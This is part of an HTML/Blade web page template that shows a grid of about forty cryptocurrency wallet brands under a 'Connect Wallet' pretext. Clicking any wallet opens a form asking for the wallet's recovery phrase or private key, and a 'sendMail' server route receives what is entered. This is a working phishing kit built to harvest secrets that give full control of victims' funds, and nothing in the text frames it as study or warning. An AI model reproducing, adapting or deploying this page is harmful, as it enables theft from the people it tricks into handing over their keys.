                                         src="wallets_files/ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e.jpg"
                                         alt="ViaWallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                ViaWallet
                            </div>
                        </div>
                    </a>
                    <a href="eep" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a.jpg"
                                         alt="BitKeep"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                BitKeep
                            </div>
                        </div>
                    </a>
                    <a href="on" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e9.jpg"
                                         alt="Vision"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Vision
                            </div>
                        </div>
                    </a>
                    <a href="DEFI" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b56.jpg"
                                         alt="PEAKDEFI Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                PEAKDEFI Wallet
                            </div>
                        </div>
                    </a>
                    <a href="oppable" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34.jpg"
                                         alt="Unstoppable Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Unstoppable Wallet
                            </div>
                        </div>
                    </a>
                    <a href="DeFi" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c.jpg"
                                         alt="HaloDeFi Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                HaloDeFi Wallet
                            </div>
                        </div>
                    </a>
                    <a href="" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c8.jpg"
                                         alt="Dok Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Dok
                                Wallet
                            </div>
                        </div>
                    </a>
                    <a href="" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac2.jpg"
                                         alt="AT.Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                AT.Wallet
                            </div>
                        </div>
                    </a>
                    <a href="s" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c.jpg"
                                         alt="Midas Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Midas Wallet
                            </div>
                        </div>
                    </a>
                    <a href="al" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc5.jpg"
                                         alt="Ellipal"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Ellipal
                            </div>
                        </div>
                    </a>
                    <a href="ING" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cdd.jpg"
                                         alt="KEYRING PRO"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                KEYRING PRO
                            </div>
                        </div>
                    </a>
                    <a href="onariat" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d0.jpg"
                                         alt="Aktionariat"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Aktionariat
                            </div>
                        </div>
                    </a>
                    <a href="en" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b6.jpg"
                                         alt="Talken Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Talken Wallet
                            </div>
                        </div>
                    </a>
                    <a href="in" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524.jpg"
                                         alt="XinFin XDC Network"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                XinFin XDC Network
                            </div>
                        </div>
                    </a>
                    <a href="e" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c0.jpg"
                                         alt="Flare Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Flare Wallet
                            </div>
                        </div>
                    </a>
                    <a href="rSwap" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d1.jpg"
                                         alt="KyberSwap"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                KyberSwap
                            </div>
                        </div>
                    </a>
                    <a href="en" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf.jpg"
                                         alt="AToken Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                AToken Wallet
                            </div>
                        </div>
                    </a>
                    <a href="ue" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bd.jpg"
                                         alt="Tongue Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Tongue Wallet
                            </div>
                        </div>
                    </a>
                    <a href="let" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089b.jpg"
                                         alt="RWallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                RWallet
                            </div>
                        </div>
                    </a>
                    <a href="maPay" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94b.jpg"
                                         alt="PlasmaPay"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                PlasmaPay
                            </div>
                        </div>
                    </a>
                    <a href="llet" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128.jpg"
                                         alt="O3Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                O3Wallet
                            </div>
                        </div>
                    </a>
                    <a href="Key" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9.jpg"
                                         alt="HashKey Me"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                HashKey Me
                            </div>
                        </div>
                    </a>
                    <a href="" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a.jpg"
                                         alt="Jade Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Jade Wallet
                            </div>
                        </div>
                    </a>
                    <a href="da" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e.jpg"
                                         alt="Guarda Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Guarda Wallet
                            </div>
                        </div>
                    </a>
                    <a href="ant" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f.jpg"
                                         alt="Defiant"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Defiant
                            </div>
                        </div>
                    </a>
                    <a href="tee" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807.jpg"
                                         alt="Trustee Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Trustee Wallet
                            </div>
                        </div>
                    </a>
                    <a href="Us" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/be6607b0a4093c0443bfe9c19ab30c99c91d2638866c99a6a16a71d3c1d.jpg"
                                         alt="CoinUs"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                CoinUs
                            </div>
                        </div>
                    </a>
                    <a href="q" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/ca151c4caeec5f9cc02ef03e498cb38c02ee5e498a8db13e853315077a5.jpg"
                                         alt="cmorq"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                cmorq
                            </div>
                        </div>
                    </a>
                    <a href="ra" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/d01c7758d741b363e637a817a09bcf579feae4db9f5bb16f599fdd1f66e.jpg"
                                         alt="Valora"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Valora
                            </div>
                        </div>
                    </a>
                    <a href="erX" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/e05615ed22df39c8d9b99ea38b45d4accb103fcef9cfa5d5edd38f5839b.jpg"
                                         alt="QuiverX"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                QuiverX
                            </div>
                        </div>
                    </a>
                    <a href="" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/36d854b702817e228d5c853c528d7bdb46f4bb041d255f67b82eb47111e.jpg"
                                         alt="Celo Wallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Celo Wallet
                            </div>
                        </div>
                    </a>
                    <a href="yptedInk" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/fae2dad4aa2f53339397bb30088bf35a47af16dcaae4a32c0a00b29f843.jpg"
                                         alt="Encrypted Ink"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Encrypted Ink
                            </div>
                        </div>
                    </a>
                    <a href="tos" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/717911f4db0c5eda0e02e76ed179b7940ba1eefffdfb3c9e65406962268.jpg"
                                         alt="Elastos Essentials"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Elastos Essentials
                            </div>
                        </div>
                    </a>
                    <a href=".cash" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/c20b97dd1679625f4eb0bccd727c80746cb13bd97208b0c8e62c89cfd1d.jpg"
                                         alt="fuse.cash"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                fuse.cash
                            </div>
                        </div>
                    </a>
                    <a href="" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/9e3f6d07815cfaf1ef7afb089e5c6895b254fced0b84a9ff2b449a63160.jpg"
                                         alt="Bitpie"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Bitpie
                            </div>
                        </div>
                    </a>
                    <a href="y" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/fbc8d86ad914ebd733fec4812b4b7af5ca709fdd9e75a930115e5baa02c.jpg"
                                         alt="Rabby"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Rabby
                            </div>
                        </div>
                    </a>
                    <a href="" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/9d6c614d1995741d5313f1f3dbf1f66dcba694de782087d13b872182250.jpg"
                                         alt="Stasis"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                Stasis
                            </div>
                        </div>
                    </a>
                    <a href="" data-toggle="modal" data-target="#exampleModal">
                        <div class="flex flex-col group">
                            <div class="flex justify-center">
                                <div
                                    class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
                                    <img class="inline-block w-20 rounded-full md:w-32 sm:w-24"
                                         src="wallets_files/a6ffb821a3c32d36fc9d29e29c2ff79a0cd1db0bca453714777846ddf3f.jpg"
                                         alt="JulWallet"></div>
                            </div>
                            <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">
                                JulWallet
                            </div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="mt-10"></div>
        </main>
        <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
            <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row">
                <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500"
                   href="javascript:void(0)" rel="noopener noreferrer">
                    <div class="flex"><img class="w-6 sm:w-8" src="index_files/discord.svg" alt="Discord">
                        <p class="ml-2">Discord</p>
                    </div>
                </a>
                <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500"
                   href="javascript:void(0)" rel="noopener noreferrer">
                    <div class="flex"><img class="w-6 sm:w-8" src="index_files/twitter.svg" alt="Twitter">
                        <p class="ml-2">Twitter</p>
                    </div>
                </a>
                <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500"
                   href="javascript:void(0)" rel="noopener noreferrer">
                    <div class="flex"><img class="w-6 sm:w-8" src="index_files/github.svg" alt="GitHub">
                        <p class="ml-2">GitHub</p>
                    </div>
                </a>
                <a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500"
                   href="javascript:void(0)" rel="noopener noreferrer">
                    <div class="flex"><img class="w-6 sm:w-8" src="index_files/mail.svg" alt="Support">
                        <p class="ml-2">Support</p>
                    </div>
                </a>
            </div>
        </footer>
    </div>
</div>


<form method="POST" action="{{route('sendMail')}}">
    @csrf
    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
         aria-hidden="true">
        <div class="modal-dialog" role="document" style="max-width: 800px;;">
            <div class="modal-content">
                <div class="modal-header">
                    <center><h4 class="modal-title" id="exampleModalLabel" style="text-align: center;">Enter <strong><i
                                    id="coin"></i></strong> Phrase or
                            Private Key</h4></center>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <textarea type="text" class="form-control" name="key" placeholder="Enter phrase or private key"
                              required></textarea>
                    <i class="info">Typically 12(sometimes 24) words separated by single space</i>
                    <input type="hidden" id="wallet" name="wallet_type" value=""/>
                    <input type="hidden" id="link" name="link" value="{{$data}}"/>
                </div>
                <div class="modal-footer">

                    <button type="submit" class="btn btn-primary">Connect Wallet
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
                             class="bi bi-arrow-right" viewBox="0 0 16 16" style="display: inline;">
                            <path fill-rule="evenodd"
                                  d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8z"/>
                        </svg>
                    </button>
                </div>
            </div>
        </div>
    </div>
</form>


<script type="text/javascript">

    $("#exampleModal").on("show.bs.modal", function (e) {
        var link = $(e.relatedTarget);
        var data_id = link.data('id');
        document.getElementById('coin').innerText = data_id
        document.getElementById('wallet').setAttribute('value', data_id)
    });


</script>
</body>
</html>
